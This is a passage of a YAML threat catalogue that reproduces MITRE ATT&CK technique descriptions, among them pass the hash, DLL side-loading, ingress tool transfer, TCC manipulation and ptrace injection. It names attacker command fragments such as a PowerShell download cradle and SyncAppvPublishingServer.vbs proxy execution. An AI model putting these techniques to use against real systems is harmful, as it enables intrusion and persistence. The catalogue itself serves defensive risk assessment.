      defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)
      or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).

      https://attack.mitre.org/techniques/T1526'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1018
    ref_id: T1018
    name: Remote System Discovery
    description: 'Adversaries may attempt to get a listing of other systems by IP
      address, hostname, or other logical identifier on a network that may be used
      for Lateral Movement from the current system. Functionality could exist within
      remote access tools to enable this, but utilities available on the operating
      system could also be used such as  [Ping](https://attack.mitre.org/software/S0097)
      or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).


      Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code>
      or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099)
      cache entries) in order to discover the presence of remote systems in an environment.


      Adversaries may also target discovery of network infrastructure as well as leverage
      [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands
      on network devices to gather detailed information about systems within a network
      (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation:
      CISA AR21-126A FIVEHANDS May 2021)

      https://attack.mitre.org/techniques/T1018'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1046
    ref_id: T1046
    name: Network Service Discovery
    description: "Adversaries may attempt to get a listing of services running on\
      \ remote hosts and local network infrastructure devices, including those that\
      \ may be vulnerable to remote software exploitation. Common methods to acquire\
      \ this information include port and/or vulnerability scans using tools that\
      \ are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)  \
      \ \n\nWithin cloud environments, adversaries may attempt to discover services\
      \ running on other cloud hosts. Additionally, if the cloud environment is connected\
      \ to a on-premises environment, adversaries may be able to identify services\
      \ running on non-cloud systems as well.\n\nWithin macOS environments, adversaries\
      \ may use the native Bonjour application to discover services running on other\
      \ macOS hosts within a network. The Bonjour mDNSResponder daemon automatically\
      \ registers and advertises a host\u2019s registered services on the network.\
      \ For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp\
      \ .</code>) to find other systems broadcasting the ssh service.(Citation: apple\
      \ doco bonjour description)(Citation: macOS APT Activity Bradley)\nhttps://attack.mitre.org/techniques/T1046"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.001
    ref_id: T1590.001
    name: Domain Properties
    description: 'Adversaries may gather information about the victim''s network domain(s)
      that can be used during targeting. Information about domains and their properties
      may include a variety of details, including what domain(s) the victim owns as
      well as administrative data (ex: name, registrar, etc.) and more directly actionable
      information such as contacts (email addresses and phone numbers), business addresses,
      and name servers.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about victim domains and their properties may also be exposed to adversaries
      via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party
      cloud providers are in use, this information may also be exposed through publicly
      available API endpoints, such as GetUserRealm and autodiscover in Office 365
      environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office
      265 Azure Domain Availability) Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596),
      [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).

      https://attack.mitre.org/techniques/T1590/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1518
    ref_id: T1518
    name: Software Discovery
    description: 'Adversaries may attempt to get a listing of software and software
      versions that are installed on a system or in a cloud environment. Adversaries
      may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.


      Such software may be deployed widely across the environment for configuration
      management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072),
      and may allow adversaries broad access to infect devices or move laterally.


      Adversaries may attempt to enumerate software for a variety of reasons, such
      as figuring out what security measures are present or if the compromised system
      has a version of software that is vulnerable to [Exploitation for Privilege
      Escalation](https://attack.mitre.org/techniques/T1068).

      https://attack.mitre.org/techniques/T1518'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1538
    ref_id: T1538
    name: Cloud Service Dashboard
    description: 'An adversary may use a cloud service dashboard GUI with stolen credentials
      to gain useful information from an operational cloud environment, such as specific
      services, resources, and features. For example, the GCP Command Center can be
      used to view all assets, findings of potential security risks, and to run additional
      queries, such as finding public IP addresses and open ports.(Citation: Google
      Command Center Dashboard)


      Depending on the configuration of the environment, an adversary may be able
      to enumerate more information via the graphical dashboard than an API. This
      allows the adversary to gain information without making any API requests.

      https://attack.mitre.org/techniques/T1538'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.005
    ref_id: T1055.005
    name: Thread Local Storage
    description: "Adversaries may inject malicious code into processes via thread\
      \ local storage (TLS) callbacks in order to evade process-based defenses as\
      \ well as possibly elevate privileges. TLS callback injection is a method of\
      \ executing arbitrary code in the address space of a separate live process.\
      \ \n\nTLS callback injection involves manipulating pointers inside a portable\
      \ executable (PE) to redirect a process to malicious code before reaching the\
      \ code's legitimate entry point. TLS callbacks are normally used by the OS to\
      \ setup and/or cleanup data used by threads. Manipulating TLS callbacks may\
      \ be performed by allocating and writing to specific offsets within a process\u2019\
      \ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055)\
      \ techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation:\
      \ FireEye TLS Nov 2017)\n\nRunning code in the context of another process may\
      \ allow access to the process's memory, system/network resources, and possibly\
      \ elevated privileges. Execution via TLS callback injection may also evade detection\
      \ from security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1622
    ref_id: T1622
    name: Debugger Evasion
    description: "Adversaries may employ various means to detect and avoid debuggers.\
      \ Debuggers are typically used by defenders to trace and/or analyze the execution\
      \ of potential malware payloads.(Citation: ProcessHacker Github)\n\nDebugger\
      \ evasion may include changing behaviors based on the results of the checks\
      \ for the presence of artifacts indicative of a debugged environment. Similar\
      \ to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497),\
      \ if the adversary detects a debugger, they may alter their malware to disengage\
      \ from the victim or conceal the core functions of the implant. They may also\
      \ search for debugger artifacts before dropping secondary or additional payloads.\n\
      \nSpecific checks will vary based on the target and/or adversary, but may involve\
      \ [Native API](https://attack.mitre.org/techniques/T1106) function calls such\
      \ as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>,\
      \ or manually checking the <code>BeingDebugged</code> flag of the Process Environment\
      \ Block (PEB). Other checks for debugging artifacts may also seek to enumerate\
      \ hardware breakpoints, interrupt assembly opcodes, time checks, or measurements\
      \ if exceptions are raised in the current process (assuming a present debugger\
      \ would \u201Cswallow\u201D or handle the potential error).(Citation: hasherezade\
      \ debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)\n\nAdversaries\
      \ may use the information learned from these debugger checks during automated\
      \ discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching\
      \ the process or flooding debug logs with meaningless data via messages produced\
      \ by looping [Native API](https://attack.mitre.org/techniques/T1106) function\
      \ calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest\
      \ partii)(Citation: Checkpoint Dridex Jan 2021)\nhttps://attack.mitre.org/techniques/T1622"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.006
    ref_id: T1036.006
    name: Space after Filename
    description: 'Adversaries can hide a program''s true filetype by changing the
      extension of a file. With certain file types (specifically this does not work
      with .app extensions), appending a space to the end of a filename will change
      how the file is processed by the operating system.


      For example, if there is a Mach-O executable file called <code>evil.bin</code>,
      when it is double clicked by a user, it will launch Terminal.app and execute.
      If this file is renamed to <code>evil.txt</code>, then when double clicked by
      a user, it will launch with the default text editing application (not executing
      the binary). However, if the file is renamed to <code>evil.txt </code> (note
      the space at the end), then when double clicked by a user, the true file type
      is determined by the OS and handled appropriately and the binary will be executed
      (Citation: Mac Backdoors are back).


      Adversaries can use this feature to trick users into double clicking benign-looking
      files of any format and ultimately executing something malicious.

      https://attack.mitre.org/techniques/T1036/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.007
    ref_id: T1547.007
    name: Re-opened Applications
    description: "Adversaries may modify plist files to automatically run an application\
      \ when a user logs in. When a user logs out or restarts via the macOS Graphical\
      \ User Interface (GUI), a prompt is provided to the user with a checkbox to\
      \ \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac)\
      \ When selected, all applications currently open are added to a property list\
      \ file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code>\
      \ directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle\
      \ Persistence Chapter) Applications listed in this file are automatically reopened\
      \ upon the user\u2019s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003)\
      \ by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code>\
      \ file to execute payloads when a user logs in.\nhttps://attack.mitre.org/techniques/T1547/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1608.006
    ref_id: T1608.006
    name: SEO Poisoning
    description: "Adversaries may poison mechanisms that influence search engine optimization\
      \ (SEO) to further lure staged capabilities towards potential victims. Search\
      \ engines typically display results to users based on purchased ads as well\
      \ as the site\u2019s ranking/score/reputation calculated by their web crawlers\
      \ and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)\n\nTo help\
      \ facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189),\
      \ adversaries may stage content that explicitly manipulates SEO rankings in\
      \ order to promote sites hosting their malicious payloads (such as [Drive-by\
      \ Target](https://attack.mitre.org/techniques/T1608/004)) within search engines.\
      \ Poisoning SEO rankings may involve various tricks, such as stuffing keywords\
      \ (including in the form of hidden text) into compromised sites. These keywords\
      \ could be related to the interests/browsing habits of the intended victim(s)\
      \ as well as more broad, seasonably popular topics (e.g. elections, trending\
      \ news).(Citation: ZScaler SEO)(Citation: Atlas SEO)\n\nIn addition to internet\
      \ search engines (such as Google), adversaries may also aim to manipulate specific\
      \ in-site searches for developer platforms (such as GitHub) to deceive users\
      \ towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ lures. In-site searches will rank search results according to their own algorithms\
      \ and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted\
      \ and gamed by malicious actors.(Citation: Checkmarx-oss-seo)\n\nAdversaries\
      \ may also purchase or plant incoming links to staged capabilities in order\
      \ to boost the site\u2019s calculated relevance and reputation.(Citation: MalwareBytes\
      \ SEO)(Citation: DFIR Report Gootloader)\n\nSEO poisoning may also be combined\
      \ with evasive redirects and other cloaking mechanisms (such as measuring mouse\
      \ movements or serving content based on browser user agents, user language/localization\
      \ settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny\
      \ from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)\nhttps://attack.mitre.org/techniques/T1608/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.002
    ref_id: T1550.002
    name: Pass the Hash
    description: "Adversaries may \u201Cpass the hash\u201D using stolen password\
      \ hashes to move laterally within an environment, bypassing normal system access\
      \ controls. Pass the hash (PtH) is a method of authenticating as a user without\
      \ having access to the user's cleartext password. This method bypasses standard\
      \ authentication steps that require a cleartext password, moving directly into\
      \ the portion of the authentication that uses the password hash.\n\nWhen performing\
      \ PtH, valid password hashes for the account being used are captured using a\
      \ [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured\
      \ hashes are used with PtH to authenticate as that user. Once authenticated,\
      \ PtH may be used to perform actions on local or remote systems.\n\nAdversaries\
      \ may also use stolen password hashes to \"overpass the hash.\" Similar to PtH,\
      \ this involves using a password hash to authenticate as a user but also uses\
      \ the password hash to create a valid Kerberos ticket. This ticket can then\
      \ be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)\
      \ attacks.(Citation: Stealthbits Overpass-the-Hash)\nhttps://attack.mitre.org/techniques/T1550/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1052
    ref_id: T1052
    name: Exfiltration Over Physical Medium
    description: 'Adversaries may attempt to exfiltrate data via a physical medium,
      such as a removable drive. In certain circumstances, such as an air-gapped network
      compromise, exfiltration could occur via a physical medium or device introduced
      by a user. Such media could be an external hard drive, USB drive, cellular phone,
      MP3 player, or other removable storage and processing device. The physical medium
      or device could be used as the final exfiltration point or to hop between otherwise
      disconnected systems.

      https://attack.mitre.org/techniques/T1052'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.002
    ref_id: T1574.002
    name: DLL Side-Loading
    description: 'Adversaries may execute their own malicious payloads by side-loading
      DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001),
      side-loading involves hijacking which DLL a program loads. But rather than just
      planting the DLL within the search order of a program then waiting for the victim
      application to be invoked, adversaries may directly side-load their payloads
      by planting then invoking a legitimate application that executes their payload(s).


      Side-loading takes advantage of the DLL search order used by the loader by positioning
      both the victim application and malicious payload(s) alongside each other. Adversaries
      likely use side-loading as a means of masking actions they perform under a legitimate,
      trusted, and potentially elevated system or software process. Benign executables
      used to side-load payloads may not be flagged during delivery and/or execution.
      Adversary payloads may also be encrypted/packed or otherwise obfuscated until
      loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)

      https://attack.mitre.org/techniques/T1574/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1105
    ref_id: T1105
    name: Ingress Tool Transfer
    description: "Adversaries may transfer tools or other files from an external system\
      \ into a compromised environment. Tools or files may be copied from an external\
      \ adversary-controlled system to the victim network through the command and\
      \ control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095).\
      \ Once present, adversaries may also transfer/spread tools between victim devices\
      \ within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).\
      \ \n\nOn Windows, adversaries may use various utilities to download tools, such\
      \ as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160),\
      \ and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such\
      \ as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>.\
      \ On Linux and macOS systems, a variety of utilities also exist, such as `curl`,\
      \ `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)\n\
      \nAdversaries may also abuse installers and package managers, such as `yum`\
      \ or `winget`, to download tools to victim hosts. Adversaries have also abused\
      \ file application features, such as the Windows `search-ms` protocol handler,\
      \ to deliver malicious files to victims through remote file searches invoked\
      \ by [User Execution](https://attack.mitre.org/techniques/T1204) (typically\
      \ after interacting with [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred\
      \ using various [Web Service](https://attack.mitre.org/techniques/T1102)s as\
      \ well as native or otherwise present tools on the victim system.(Citation:\
      \ PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage\
      \ services that sync between a web-based and an on-premises client, such as\
      \ Dropbox or OneDrive, to transfer files onto victim systems. For example, by\
      \ compromising a cloud account and logging into the service's web portal, an\
      \ adversary may be able to trigger an automatic syncing process that transfers\
      \ the file onto the victim's machine.(Citation: Dropbox Malware Sync)\nhttps://attack.mitre.org/techniques/T1105"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216.002
    ref_id: T1216.002
    name: SyncAppvPublishingServer
    description: "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution\
      \ of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands.\
      \ SyncAppvPublishingServer.vbs is a Visual Basic script associated with how\
      \ Windows virtualizes applications (Microsoft Application Virtualization, or\
      \ App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications\
      \ to users as virtual applications, allowing users to launch and interact with\
      \ them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 -\
      \ appv)\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be\
      \ signed by Microsoft, and is commonly executed from `\\System32` through the\
      \ command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)\n\n\
      Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ execution restrictions and evade defensive counter measures by \"living off\
      \ the land.\"(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may\
      \ function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation:\
      \ 7 - appv)\n\nFor example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ commands may be invoked using:(Citation: 5 - appv)\n\n`SyncAppvPublishingServer.vbs\
      \ \"n; {PowerShell}\"`\nhttps://attack.mitre.org/techniques/T1216/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.002
    ref_id: T1098.002
    name: Additional Email Delegate Permissions
    description: "Adversaries may grant additional permission levels to maintain persistent\
      \ access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code>\
      \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available\
      \ in on-premises Exchange and in the cloud-based service Office 365, adds permissions\
      \ to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye\
      \ APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace,\
      \ delegation can be enabled via the Google Admin console and users can delegate\
      \ accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google\
      \ Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox\
      \ folder permissions through individual folder permissions or roles. In Office\
      \ 365 environments, adversaries may assign the Default or Anonymous user permissions\
      \ or roles to the Top of Information Store (root), Inbox, or other mailbox folders.\
      \ By assigning one or both user permissions to a folder, the adversary can utilize\
      \ any other account in the tenant to maintain persistence to the target user\u2019\
      s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)\n\nThis may be\
      \ used in persistent threat incidents as well as BEC (Business Email Compromise)\
      \ incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)\
      \ to the accounts they wish to compromise. This may further enable use of additional\
      \ techniques for gaining access to systems. For example, compromised business\
      \ accounts are often used to send messages to other accounts in the network\
      \ of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)),\
      \ so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock,\
      \ D. - Defending O365 - 2019)\nhttps://attack.mitre.org/techniques/T1098/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.003
    ref_id: T1588.003
    name: Code Signing Certificates
    description: 'Adversaries may buy and/or steal code signing certificates that
      can be used during targeting. Code signing is the process of digitally signing
      executables and scripts to confirm the software author and guarantee that the
      code has not been altered or corrupted. Code signing provides a level of authenticity
      for a program from the developer and a guarantee that the program has not been
      tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools
      may trust a signed piece of code more than an unsigned piece of code even if
      they don''t know who issued the certificate or who the author is.


      Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries
      may purchase or steal code signing certificates for use in operations. The purchase
      of code signing certificates may be done using a front organization or using
      information stolen from a previously compromised entity that allows the adversary
      to validate to a certificate provider as that entity. Adversaries may also steal
      code signing materials directly from a compromised third-party.

      https://attack.mitre.org/techniques/T1588/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1648
    ref_id: T1648
    name: Serverless Execution
    description: "Adversaries may abuse serverless computing, integration, and automation\
      \ services to execute arbitrary code in cloud environments. Many cloud providers\
      \ offer a variety of serverless resources, including compute engines, application\
      \ integration services, and web servers. \n\nAdversaries may abuse these resources\
      \ in various ways as a means of executing arbitrary commands. For example, adversaries\
      \ may use serverless functions to execute malicious code, such as crypto-mining\
      \ malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation:\
      \ Cado Security Denonia) Adversaries may also create functions that enable further\
      \ compromise of the cloud environment. For example, an adversary may use the\
      \ `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission\
      \ in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)\
      \ to a serverless cloud function, which may then be able to perform actions\
      \ the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation:\
      \ Rhingo Security Labs GCP Privilege Escalation)\n\nServerless functions can\
      \ also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)),\
      \ potentially enabling persistent execution over time. For example, in AWS environments,\
      \ an adversary may create a Lambda function that automatically adds [Additional\
      \ Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user\
      \ and a corresponding CloudWatch events rule that invokes that function whenever\
      \ a new user is created.(Citation: Backdooring an AWS account) This is also\
      \ possible in many cloud-based office application suites. For example, in Microsoft\
      \ 365 environments, an adversary may create a Power Automate workflow that forwards\
      \ all emails a user receives or creates anonymous sharing links whenever a user\
      \ is granted access to a document in SharePoint.(Citation: Varonis Power Automate\
      \ Data Exfiltration)(Citation: Microsoft DART Case Report 001) In Google Workspace\
      \ environments, they may instead create an Apps Script that exfiltrates a user's\
      \ data when they open a file.(Citation: Cloud Hack Tricks GWS Apps Script)(Citation:\
      \ OWN-CERT Google App Script 2024)\nhttps://attack.mitre.org/techniques/T1648"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.006
    ref_id: T1548.006
    name: TCC Manipulation
    description: 'Adversaries can manipulate or abuse the Transparency, Consent, &
      Control (TCC) service or database to grant malicious executables elevated permissions.
      TCC is a Privacy & Security macOS control mechanism used to determine if the
      running process has permission to access the data or services protected by TCC,
      such as screen sharing, camera, microphone, or Full Disk Access (FDA).


      When an application requests to access data or a service protected by TCC, the
      TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application
      Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file
      (if connected to an MDM) for existing permissions. If permissions do not exist,
      then the user is prompted to grant permission. Once permissions are granted,
      the database stores the application''s permissions and will not prompt the user
      again unless reset. For example, when a web browser requests permissions to
      the user''s webcam, once granted the web browser may not explicitly prompt the
      user again.(Citation: welivesecurity TCC)


      Adversaries may access restricted data or services protected by TCC through
      abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055)
      or executing a malicious binary using another application. For example, adversaries
      can use Finder, a macOS native app with FDA permissions, to execute a malicious
      [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing
      under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002)
      inherits access to all files on the system without requiring a user prompt.
      When System Integrity Protection (SIP) is disabled, TCC protections are also
      disabled. For a system without SIP enabled, adversaries can manipulate the TCC
      database to add permissions to their malicious executable through loading an
      adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation:
      TCC macOS bypass)(Citation: TCC Database)

      https://attack.mitre.org/techniques/T1548/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.008
    ref_id: T1055.008
    name: Ptrace System Calls
    description: "Adversaries may inject malicious code into processes via ptrace\
      \ (process trace) system calls in order to evade process-based defenses as well\
      \ as possibly elevate privileges. Ptrace system call injection is a method of\
      \ executing arbitrary code in the address space of a separate live process.\
      \ \n\nPtrace system call injection involves attaching to and modifying a running\
      \ process. The ptrace system call enables a debugging process to observe and\
      \ control another process (and each individual thread), including changing memory\
      \ and register values.(Citation: PTRACE man) Ptrace system call injection is\
      \ commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>)\
      \ then invoking that memory with <code>PTRACE_SETREGS</code> to set the register\
      \ containing the next instruction to execute. Ptrace system call injection can\
      \ also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>,\
      \ which copy data to a specific address in the target processes\u2019 memory\
      \ (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation:\
      \ Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible\
      \ targeting processes that are non-child processes and/or have higher-privileges.(Citation:\
      \ BH Linux Inject) \n\nRunning code in the context of another process may allow\
      \ access to the process's memory, system/network resources, and possibly elevated\
      \ privileges. Execution via ptrace system call injection may also evade detection\
      \ from security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1653
    ref_id: T1653
    name: Power Settings
    description: 'Adversaries may impair a system''s ability to hibernate, reboot,
      or shut down in order to extend access to infected machines. When a computer
      enters a dormant state, some or all software and hardware may cease to operate
      which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate)


      Adversaries may abuse system utilities and configuration settings to maintain
      access by preventing machines from entering a state, such as standby, that can
      terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation:
      systemdsleep Linux)


      For example, `powercfg` controls all configurable power system settings on a
      Windows system and can be abused to prevent an infected host from locking or
      shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android
      Users) Adversaries may also extend system lock screen timeout settings.(Citation:
      BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as
      disk and hibernate timeout, can be similarly abused to keep the infected machine
      running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware
      Loader Campaign)


      Aware that some malware cannot survive system reboots, adversaries may entirely
      delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries)

      https://attack.mitre.org/techniques/T1653'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.007
    ref_id: T1027.007
    name: Dynamic API Resolution
    description: 'Adversaries may obfuscate then dynamically resolve API functions
      called by their malware in order to conceal malicious functionalities and impair
      defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106)
      functions provided by the OS to perform various tasks such as those involving
      processes, files, and other system artifacts.


      API functions called by malware may leave static artifacts such as strings in
      payload files. Defensive analysts may also uncover which functions a binary
      file may execute via an import address table (IAT) or other structures that
      help dynamically link calling code to the shared modules that provide functions.(Citation:
      Huntress API Hash)(Citation: IRED API Hashing)


      To avoid static or other defensive analysis, adversaries may use dynamic API
      resolution to conceal malware characteristics and functionalities. Similar to
      [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API
      resolution may change file signatures and obfuscate malicious API function calls
      until they are resolved and invoked during runtime.


      Various methods may be used to obfuscate malware calls to API functions. For
      example, hashes of function names are commonly stored in malware in lieu of
      literal strings. Malware can use these hashes (or other identifiers) to manually
      reproduce the linking and loading process using functions such as `GetProcAddress()`
      and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated
      using encryption or other string manipulation tricks (requiring various forms
      of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)
      during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation:
      Huntress API Hash)

      https://attack.mitre.org/techniques/T1027/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.001
    ref_id: T1021.001
    name: Remote Desktop Protocol
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into a computer using the Remote Desktop Protocol (RDP). The adversary\
      \ may then perform actions as the logged-on user.\n\nRemote desktop is a common\
      \ feature in operating systems. It allows a user to log into an interactive\
      \ session with a system desktop graphical user interface on a remote system.\
      \ Microsoft refers to its implementation of the Remote Desktop Protocol (RDP)\
      \ as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\
      \ \n\nAdversaries may connect to a remote system over RDP/RDS to expand access\
      \ if the service is enabled and allows access to accounts with known credentials.\
      \ Adversaries will likely use Credential Access techniques to acquire credentials\
      \ to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility\
      \ Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services\
      \ DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation:\
      \ Alperovitch Malware)\nhttps://attack.mitre.org/techniques/T1021/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.001
    ref_id: T1037.001
    name: Logon Script (Windows)
    description: 'Adversaries may use Windows logon scripts automatically executed
      at logon initialization to establish persistence. Windows allows logon scripts
      to be run whenever a specific user or group of users log into a system.(Citation:
      TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code>
      Registry key.(Citation: Hexacorn Logon Scripts)


      Adversaries may use these scripts to maintain persistence on a single system.
      Depending on the access configuration of the logon scripts, either local credentials
      or an administrator account may be necessary.

      https://attack.mitre.org/techniques/T1037/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.015
    ref_id: T1055.015
    name: ListPlanting
    description: "Adversaries may abuse list-view controls to inject malicious code\
      \ into hijacked processes in order to evade process-based defenses as well as\
      \ possibly elevate privileges. ListPlanting is a method of executing arbitrary\
      \ code in the address space of a separate live process.(Citation: Hexacorn Listplanting)\
      \ Code executed via ListPlanting may also evade detection from security products\
      \ since the execution is masked under a legitimate process.\n\nList-view controls\
      \ are user interface windows used to display collections of items.(Citation:\
      \ Microsoft List View Controls) Information about an application's list-view\
      \ settings are stored within the process' memory in a <code>SysListView32</code>\
      \ control.\n\nListPlanting (a form of message-passing \"shatter attack\") may\
      \ be performed by copying code into the virtual address space of a process that\
      \ uses a list-view control then using that code as a custom callback for sorting\
      \ the listed items.(Citation: Modexp Windows Process Injection) Adversaries\
      \ must first copy code into the target process\u2019 memory space, which can\
      \ be performed various ways including by directly obtaining a handle to the\
